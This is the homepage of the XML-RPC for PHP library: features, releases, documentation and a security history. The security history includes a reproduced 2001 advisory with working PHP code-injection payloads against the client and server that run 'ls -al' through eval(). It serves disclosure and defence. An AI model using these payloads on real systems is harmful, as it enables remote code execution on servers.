<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>XML-RPC for PHP</title>
<link rel="icon" type="image/vnd.microsoft.icon" href="favicon.ico" />
<link rel="stylesheet" type="text/css" href="xmlrpc.css" />
</head>
<body>
<h1>XML-RPC for PHP</h1>
<div id="menu">
<a href="#news">News</a> |
<a href="#download">Download</a> |
<a href="#features">Features</a> |
<a href="#requirements">Requirements</a> |
<a href="#interest">Documentation</a> |
<a href="#demoserver">Online demo server</a> |
<a href="#debugger">Online xmlrpc debugger</a> |
<a href="#development">Development</a> |
<a href="#roadmap">Roadmap</a> |
<a href="#history">History</a> |
<a href="#mailinglists">Mailing lists</a> |
<a href="#contact">Contact</a> |
<a href="#security">Security</a>
</div>
<div id="content">

<h2>Introduction</h2>
<p>Welcome to the homepage of "XML-RPC for PHP". It is a library implementing the <a href="http://www.xmlrpc.com/">XML-RPC</a> protocol, written in <a href="http://www.php.net/">PHP</a>. It is also known as PHPXMLRPC.<br/>
It is designed for ease of use, flexibility and completeness. High speed and reduced memory footprint are not the main goals of the project.
</p>
<p>Note that this is not <a href="http://xmlrpc-epi.sourceforge.net/">the library</a> which can be compiled as a <a href="https://pecl.php.net/package/xmlrpc">php extension</a> and has been bundled with php from version 4.1 up to version 7.4.<br/>
This is also not the same library as <a href="http://pear.php.net/package/XML_RPC/">the one</a> that is part of PEAR, either. They both share a common ancestry, since the PEAR version is a branch of the original phpxmlrpc library, later independently maintained.</p>

<h2><a name="features">Main Features</a></h2>
<ul>
<li>Support for creating both xmlrpc clients and servers</li>
<li>Fully automated or fully manual, fine-grained encoding and decoding from php values to xmlrpc</li>
<li>Support for UTF8, Latin-1 and ASCII character encodings. With the php mbstring extension enabled, even more character sets are supported</li>
<li>Support for http features including compression of both requests and responses, cookies, proxies, basic auth, https, ntlm auth and keepalives with the php cURL extension</li>
<li>Optional validation of parameter types of incoming xmlrpc request</li>
<li>Support for system.listMethods, system.methodHelp, system.multicall and system.getCapabilities methods</li>
<li>Support for the &lt;NIL/&gt; and &lt;EX:NIL/&gt; extensions to xmlrpc</li>
<li>Possibility to register existing php function or class methods as webservices, extracting value-added information from phpdoc comments</li>
<li>A web based visual debugger is included with the library</li>
<li>A package emulating the API of the native XML-RPC extension for PHP, built on this library, is available at <a href="https://github.com/gggeek/polyfill-xmlrpc">https://github.com/gggeek/polyfill-xmlrpc</a></li>
<!--<li>Many other cool features are delivered with the 'Extras' package, such as a complete emulation layer of php native xmlrpc calls, an xmlrpc server that generates html documentation of exposed webservices, and a complete jsonrpc library...</li>
<li>Last but not least, <a href="http://gggeek.github.io/jsxmlrpc/">a version of the library</a> implementing the same API in Javascript is available, allowing to leverage acquired knowledge to easily build ajax/dhtml clients</li>-->
</ul>

<h2><a name="requirements">Requirements</a></h2>
<ul>
<li>PHP 5.3.0 or later; 7.4 or later recommended</li>
<li>the php "curl" extension is needed if you wish to use SSL or HTTP 1.1 to communicate with remote servers</li>
<li>the php "mbstring" extension is needed to allow reception of requests/responses in character sets other than ASCII, Latin-1, UTF-8</li>
<li>the php "xmlrpc" native extension is not required, but if it is installed, there will be no interference with the operation of this library</li>
</ul>

<h2><a name="download">Download</a></h2>
<p>The latest stable release is version <a href="https://github.com/gggeek/phpxmlrpc/releases/tag/4.6.0"><span class="evidence">4.6.0</span></a> released on Dec. 9th, 2021
(<a href="https://github.com/gggeek/phpxmlrpc/releases/tag/4.6.0">Release notes</a>)</p>
<p>The previous stable branch release is version <a href="https://github.com/gggeek/phpxmlrpc/releases/tag/3.1.2"><span class="evidence">3.1.2</span></a> released on May 27th, 2019
(<a href="https://github.com/gggeek/phpxmlrpc/releases/tag/3.1.2">Release notes</a>)</p>

<h2><a name="news">News</a></h2>
<ul>
<li>
    9th of December, 2021<br/>

    Released lib version 4.6.0.<br/>
    The release notes are available on <a href="https://github.com/gggeek/phpxmlrpc/releases/tag/4.6.0">Github</a><br/><br/>
</li>

<li>
    3rd of January, 2021<br/>

    Released lib version 4.5.1.<br/>
    The release notes are available on <a href="https://github.com/gggeek/phpxmlrpc/releases/tag/4.5.1">Github</a><br/><br/>
</li>

<li>
    31st of December, 2020<br/>

    Released lib version 4.5.0.<br/>
    The release notes are available on <a href="https://github.com/gggeek/phpxmlrpc/releases/tag/4.5.0">Github</a><br/><br/>
</li>

<li>
    17th of December, 2020<br/>

    Released lib version 4.4.3.<br/>
    The release notes are available on <a href="https://github.com/gggeek/phpxmlrpc/releases/tag/4.4.3">Github</a><br/><br/>
</li>

<li>
    4th of March, 2020<br/>

    Released lib version 4.4.2.<br/>
    The release notes are available on <a href="https://github.com/gggeek/phpxmlrpc/releases/tag/4.4.2">Github</a><br/><br/>
</li>

<li>
    29th of July, 2019<br/>
    Released lib version 4.4.1.<br/>
    The release notes are available on <a href="https://github.com/gggeek/phpxmlrpc/releases/tag/4.4.1">Github</a><br/><br/>
</li>

<li>
    6th of November, 2017<br/>
    Released lib version 4.3.0.<br/>
    The release notes are available on <a href="https://github.com/gggeek/phpxmlrpc/releases/tag/4.3.0">Github</a><br/><br/>
</li>

<li>
    1st of July, 2017<br/>
    Released lib versions 4.2.0 and 3.1.0.<br/>
    The release notes are available on <a href="https://github.com/gggeek/phpxmlrpc/releases/">Github</a><br/><br/>
</li>

<li>
    20th of January, 2016<br/>
    Released lib version 4.0.0.<br/>
    This is the first time - ever - that the API sees major changes, doing away with the past and starts a transition to modern-day php.<br/>
    Namespaces have been introduced, and the default character set in use if UTF-8; support for mbstring has been added, and much more.<br/>
    For a complete list of changes, head on to <a href="https://github.com/gggeek/phpxmlrpc/releases/tag/4.0.0">the announcement</a> on Github<br/><br/>
</li>

<li>
    19th of April, 2015<br/>
    Released lib version 3.0.1.<br/><br/>
</li>

<li>
    15th of June, 2014<br/>
    Released lib version 3.0.0.<br/><br/>
</li>

<li>
    15th of December, 2013<br/>
    The project moved to GitHub<br/><br/>
</li>

</ul>
<a href="news.html">Older news...</a>

<h2><a name="interest">Documentation</a></h2>
<ul>
<li>A full user manual for version 4 is not yet available; for the moment the <a href="doc-4/api/index.html">API docs</a> will have to do.</li>
<li>Documentation for <b>OLD</b> version 3, in <a href="doc-2/">HTML</a> or <a href="doc-2/xmlrpc_php.pdf">PDF</a> format (note: the PDF version is not always up to date).<br/>
For the adventurous there is even an <a href="doc-2/xmlrpc_php.xml">xml+css</a> version (note: better viewing results obtained by Firefox and Opera users)</li>
<li><a href="doc-1.1/">Documentation for version 1.2.1</a></li>
<li><a href="doc/">Documentation for version 1.0.99 (older)</a></li>
</ul>

<h2><a name="demoserver">Online demo server</a></h2>
<p>A demo server is active at the address <b>http://gggeek.altervista.org/sw/xmlrpc/demo/server/server.php</b>. It exposes functions that can be used for interoperability testing (the full code for the server is included in the Git version of the library).<br/>
<!--You can see the source code here: <a href="http://gggeek.altervista.org/sw/xmlrpc/demo/server/server.php?showSource=TRUE">http://phpxmlrpc.sourceforge.net/server.php</a> (the xmlrpc server will activate on POST requests, and display its API on GET requests), and auto-generated documentation <a href="server.php">here</a>--></p>

<h2><a name="debugger">Online xmlrpc debugger</a></h2>
<p>A demo xmlrpc debugger application, built on top of this library, is active at the address <a href="http://gggeek.altervista.org/sw/xmlrpc/debugger/">http://gggeek.altervista.org/sw/xmlrpc/debugger/</a>.
You can use the debugger to e.g. query the demo server, or debug your own personal xmlrpc server, if it is accessible on the net.</p>

<h2><a name="development">Development</a></h2>
<p><a href="https://github.com/gggeek/phpxmlrpc/">GitHub home page</a> (downloads, source code and bug tracker).</p>

<h2><a name="roadmap">Roadmap</a></h2>
<p>See the list of issues on <a href="https://github.com/gggeek/phpxmlrpc/issues">Github</a></p>

<h2><a name="history">History</a></h2>
<p>XML-RPC for PHP was originally developed by Edd Dumbill of <a href="http://usefulinc.com/">Useful Information Company</a>. As of the 1.0 stable release, the project was opened to wider involvement and moved to SourceForge. It is hosted on GitHub since December 2013.</p>
<p>PHPXMLRPC or derivative versions are or have been used in many open source projects, including <a href="http://www.ampache.org/">Ampache</a>, <a href="http://xaraya.info/">Xaraya</a>, <a href="http://www.drupal.org/">Drupal</a> (only up to releases 4.6.2 and 4.5.4), <a href="http://www.postnuke.com/">PostNuke</a>, <a href="http://b2evolution.net/">b2evolution</a>, <a href="http://nucleuscms.org/">nucleus cms</a>, <a href="http://www.phpmyfaq.de/">phpmyfaq</a>, <a href="http://www.phppgads.com/">phpPgAds</a>, <a href="http://en.wikipedia.org/wiki/PhpGroupWare">phpgroupware</a>, <a href="http://www.egroupware.org/">egroupware</a>, <a href="http://tikiwiki.org">TikiWiki</a>, Civicspace (old release only), <a href="http://mailwatch.org/">MailWatch for MailScanner</a>, <a href="http://wikisophia.org/wiki/Wikitex">WikiTeX</a> and <a href="http://openautonomy.com/">OpenAutonomy</a>.</p>

<h2><a name="mailinglists">Mailing lists</a></h2>
<ul>
<li><a href="https://lists.usefulinc.com/pipermail/phpxmlrpc/">User's mailing list</a> - very low traffic</li>
<li><a href="https://sourceforge.net/p/phpxmlrpc/mailman/phpxmlrpc-devel/">Developers' mailing list</a> - discontinued as of December 2013</li>
</ul>

<h2><a name="contact">Contact</a></h2>
<!-- See the lib's <a href="http://sourceforge.net/projects/phpxmlrpc/">SourceForge home page</a> for the complete list of maintainers, file a bug report, feature request or patch.<br/> -->
For security related issues feel free to contact <a href="http://sourceforge.net/sendmessage.php?touser=114789">ggiunta at users.sourceforge.net</a>

<h2><a name="security">Security</a></h2>
<div class="incident">
<h3>The third security breach: august 2005</h3>
<p>This was a further and proactive response to the second security breach below.  All use of eval() has been removed since it was still a potential exploit.</p>
<p>When the library was originally written, the versions of php available at the time did not include call_user_func(), et al.  So it was written within those constraints to use eval() in two of the functions called by the xml parser.  Due to this usage, the server class also used eval() since it had to parse xml using the same functions.</p>
<p>These handler functions, and the array used to maintain the content of the original message, have been rewritten to construct php values instead of building php code for evaluation.  This should remove any potential for code execution.</p>
</div>

<div class="incident">
<h3>The second security breach: july 2005</h3>
<p>The security vulnerability discovered by James Bercegay of GulfTech Security Research on the the 27th of June, 2005, has caused quite a stir. It has made it to the front page of Salshdot, has been mentioned on Netcraft, LWN and many other sites.</p>
<p>Detailed instructions on building exploit code have been released on the internet, and many web hosting administrators are left wondering what is the best defense plan, and what are the real risks. Here are some answers.</p>

<h3>Scope of the problem</h3>
<ul>
<li>the bug affects the two libraries known as PEAR::XMLRPC and PHPXMLRMPC.<br/>It DOES NOT affect the xmlrpc implementation which is built-in in php and enabled at compile time with the "--with-xmlrpc" option (on Unix, on windows generally it is enabled/disabled by changing the appropriate line in php.ini)</li>
<li>the bug (execution of php-code injected by remote hosts) resides exclusively in the file <b>xmlrpc.inc</b> in the phpxmlrpc distribution and <b>RPC.php</b> in the PEAR distribution</li>
<li>both PEAR::XMLRPC and PHPXMLRMPC have released updated versions of the library that fix the problem</li>
<li>both libraries have been used in a large number of php applications (see the incomplete list above).<br/>
Since the whole lib consists basically of 2 very simple files, everybody tends to patch them according to its own tastes/needs and bundle them when distributing their app.<br/>
Most high-profile projects have been extremely quick in releasing new versions of their respective apps, but it will take a much longer time for every single user to update his system.<br/>
It has to be said that many applications had been shipping until recently with extremely outdated versions of the phpxmlrpc library included; <a>a first injection bug had been fixed in 2001</a> without anyone apparently taking notice (...)<br/><br/>
This makes it unfortunately a lot harder for sysadmins to find an easy cure for the problem: there is a great chance that on public hosting servers the aforementioned files will be found in many different directories and in many different versions.</li>
</ul>
<h3>How the vulnerability is triggered</h3>
<ul>
<li>to trigger the bug an attacker needs to have some specially crafted xml evaluated in the creation process of an xmlrpcval object. Xmlrpcval objects are created when the server script decodes xmlrpc requests or when some php scripts acts as an xmlrpc client and decodes a response sent by a server.<br/>
The server script is application specific, and it is often named server.php (but any project- or user-chosen variant is possible), and it has to include both xmlrpc.inc and xmlrpcs.inc files (for the pear version, server.php is the equivalent of xmlrpcs.inc).</li>
<li>Only including xmlrpc.inc and xmlrpcs.inc in php scripts is (afaik...) completely safe, as well as calling them directly via http requests, since only definition of functions, variables and classes is carried out in those two files, i.e. no immediate code execution.</li>
<li>The server.php and discuss.php files distributed with full the phpxmlrpc lib actually do implement a live xmlrpc server, so you might consider blocking access to them or even better removing them if you find them deployed on production servers (off the top of my mind I can conjure some kind of attack involving a second php app suffering of a takeover-php-file-inclusion breach to pull them in + exploit the lib known bug)</li>
</ul>
<h3>Means of protection</h3>
<ul>
<li>Give your web server process as little system privileges as you can. On Unix this generally involves running Apache as user nobody and/or in a jailrooted/chrooted environment. Since the PHP engine runs under the same user as the web server, this is the first line of defense: any php code injected by an attacker will run on the server as a least privileged user, and all damage it could do will be limited to disrupting the php application itself</li>
<li>Run php in safe mode. If you are a public host and are not doing this, chances are your server has been rooted anyway. This prevents the php scripts from using any function you deem to be unsafe, such as system() or eval()</li>
<li><span class="evidence">The hard block:</span> find all the existing phpxmlrpc files (xmlrpc.inc and xmlrpcs.inc) and disable them (chmod 0) across the system.<br/>
This may of course prevent some user applications from working so you should inform your users at the time you do it.</li>
<li><span class="evidence">The soft block:</span> replace all copies of existing phpxmlrpc files (xmlrpc.inc and xmlrpcs.inc) with the ones coming from version 1.1.1.<br/>
This method is unfortunately not 100% guaranteed to keep all apps working. Some internals of the lib objects changed from version 0.9 to 1.0 to 1.1 (e.g. the representation of http headers stored inside an xmlrpcresp object), and if code you have deployed on your servers subclasses them, it might find itself in trouble. The xml sent over-the-wire has changed too with respect to some older versions of the lib (in particular: version 1.0.99.2 wrongly encoded chars outside the ASCII range as html entities, whereas now they are encoded as xml charset entities). A couple of new error response codes have been added, too. Having said that, you should be 95% safe running that script and sit there waiting for users to start yelling something is broken...</li>
<li>the PHP PEAR library is upgradeable  with a one-line command, so that's not really a huge problem:<br/>
<pre>pear upgrade XML_RPC</pre>
and to tell whether it's been upgraded (1.3.1 or later is OK, the latest as of now is 1.3.2):<br/>
<pre>pear list | grep RPC</pre></li>
</ul>
<h3>Some extra considerations</h3>
The file xmlrpcs.inc has been patched too in release 1.1.1 to provide a better user experience. In more detail: sending specially crafted malformed xml to a server would cause the php script to emit a php error instead of returning an appropriate xml response.<br/>
According to some, this actually entails a "path disclosure security breach" (i.e. the php error message displayed usually contains sensitive information about filesystem paths), but then any single PHP script suffers of the same security problem if the sysadmin is running production servers with the ini directive display_errors=On.<br/>
I also know for a fact that there are many places in xmlrpc.inc where calling a function with an unexpected parameter will generate a php warning or error, and I am not planning to implement strict parameter check for every single function anytime soon - if you aim for that, imho, you might as well code in java in the first place.
<h3>Is this the end of the world?</h3>
I hope not.<br/>
The reason is there are tens of PHP applications out there that suffer from code injection exploits. Just take a look at the security track of bulletin boards... and yet a lot of people still think PHP is a good choice for web development.<br/>
Remember: security is a process, not a state that can be reached.<br/><br/>
Gaetano Giunta
</div>

<div class="incident">
<h3>The first security breach: september 2001</h3>
<pre>
I received this advisory from Dan Libby. With his
permission it is reproduced here.  Note that this exploit is fixed
in revisions 1.01 and greater of XML-RPC for PHP.

 -- Edd Dumbill


Tue Sep 24 2001
===============

PHP Security Hole: potential XML-RPC exploit
============================================

Abstract:

Using the latest release of Useful Inc's php xmlrpc library, version 1.0,
it is possible for an attacker to structure the xml in such a way as to
trick the xml-rpc library into executing php code on a web server.  I
was able to execute arbitrary php code, and with php's safe-mode turned
off, system commands.  An attacker could easily use this as a gateway for
launching viruses.

Details:

I demonstrated the problem by modifying the server.php example script
included with the xmlrpc distribution and then calling it via the
client.php script, also part of the distribution. I bypassed the standard
server code, and simply echo'd responses back to the client. I was
able to get the client to execute arbitrary php code. I then restored the
server.php sample to its original state and used telnet to send a modified
request. I was also able to make code execute on the server, albeit requiring
a slightly different syntax.

The attack centers around use of php's eval() function. Since I knew that
the xml-rpc library uses eval to construct its data structures from xml
input, it was just a matter of structuring the input xml in such a
manner that it:

a) is not escaped before being passed to eval
b) does not generate a php syntax error

Normally, all non numeric data is escaped by the library before being
passed to eval.  However, it turns out that if you send a &lt;value&gt; tag,
followed by an unexpected tag, such as &lt;foo&gt;, the escaping code will be
bypassed and "raw" data will be evaluated instead.

Exploiting the client:

Here is a typical xml-rpc response:

&lt;?xml version="1.0"?&gt;
&lt;methodResponse&gt;
&lt;params&gt;&lt;param&gt;

&lt;value&gt;&lt;string&gt;hello world&lt;/string&gt;&lt;/value&gt;

&lt;/param&gt;&lt;/params&gt;
&lt;/methodResponse&gt;

When such a response is eval'ed, it looks like:

new xmlrpcval("hello world", "string")


Here is an xml-rpc response that will execute php code to echo "&lt;h1&gt; hello
world &lt;/h1&gt;" on the client side:

&lt;?xml version="1.0"?&gt;
&lt;methodResponse&gt;
&lt;params&gt;&lt;param&gt;

&lt;value&gt;&lt;foo&gt;", "string"); echo "&lt;h1&gt; hello world &lt;/h1&gt;"; \$waste = array("&lt;/foo&gt;&lt;/value&gt;

&lt;/param&gt;&lt;/params&gt;
&lt;/methodResponse&gt;


In this case, the string that will be eval'ed is:

new xmlrpcval("", "string"); echo "&lt;h1&gt; hello world &lt;/h1&gt;"; $waste = array("", 'string')



It is possible to replace everything between "string"); and \$waste with
arbitrary code of just about any length.

Finally, here's one that will print the contents of the current directory:

&lt;?xml version="1.0"?&gt;
&lt;methodResponse&gt;
&lt;params&gt;
&lt;param&gt;
&lt;value&gt;&lt;foo&gt;&#34;, "string");

echo "&lt;h1&gt;&lt;font color=red&gt;if you see a directory listing, I just executed php and system code via xml-rpc.&lt;/font&gt;&lt;/h1&gt;";
echo "now I will attempt a directory listing using ls -al:\n&lt;xmp&gt;"; echo `ls -al`; echo "&lt;/xmp&gt;";
echo "I could just have easily invoked rm -rf, or written a program to disk and executed it (eg, a virus)
 or read some files. Have a nice day.&lt;br&gt;&lt;br&gt;";
exit;

\$waste = array("&lt;/foo&gt;&lt;/value&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodResponse&gt;

Exploiting the server:

The server exploit is just about the same as the client, except that the
server is using a different eval command, and thus it requires slightly
different begin and ending syntax to avoid php syntax errors.

Here is the same code as above, but it will work against a server.

&lt;?xml version='1.0' encoding="iso-8859-1" ?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;system.listMethods&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;
&lt;value&gt;&lt;test&gt;&#34;, "string"));

echo "&lt;h1&gt;&lt;font color=red&gt;if you see a directory listing, I just executed php and system code via xml-rpc.&lt;/font&gt;&lt;/h1&gt;";
echo "now I will attempt a directory listing using ls -al:\n&lt;xmp&gt;"; echo `ls -al`; echo "&lt;/xmp&gt;";

echo "I could just have easily invoked rm -rf, or written a program to disk and executed it (eg, a virus)
 or read some files. Have a nice day.&lt;br&gt;&lt;br&gt;";
exit;

$waste = array(array("&lt;/test&gt;&lt;/value&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;


Problem Area:

in xmlrpc.inc, there is a function called xmlrpc_cd(), which is called by
the xml parser to handle character data.

function xmlrpc_cd($parser, $data) {
   global $_xh, $xmlrpc_backslash, $xmlrpc_twoslash;

//if (ereg("^[\n\r \t]+$", $data)) return;
// print "adding [${data}]\n";
   if ($_xh[$parser]['lv']==1) {
      $_xh[$parser]['qt']=1;
      $_xh[$parser]['lv']=2;
   }
   if ($_xh[$parser]['qt']) { // quoted string
      $_xh[$parser]['ac'].=str_replace('\$', '\\$',
                                       str_replace('"', '\"',
                                                   str_replace(chr(92),$xmlrpc_backslash, $data)));
   }
   else
      $_xh[$parser]['ac'].=$data;
}

It is the last else that is causing data to be added without escaping.  It
is very dangerous to have this.  This else seems to be intended for
numeric data, and great pains are taken to set and unset the "qt" (quote)
variable which turns escaping on and off. However, it is not immediately
apparent to me why numeric data should not be similarly escaped, and the
if/else removed, such that there is zero chance for this type of exploit.
</pre>
</div>


<hr/>
<a href="http://validator.w3.org/check?uri=http%3A%2F%2Fgggeek.github.io%2Fphpxmlrpc%2F"><img
        src="//www.w3.org/Icons/valid-xhtml10" height="31" width="88"
        alt="Valid XHTML 1.0!" /></a><br/>
Page last updated: 2021/12/11

</div>
</body>
</html>
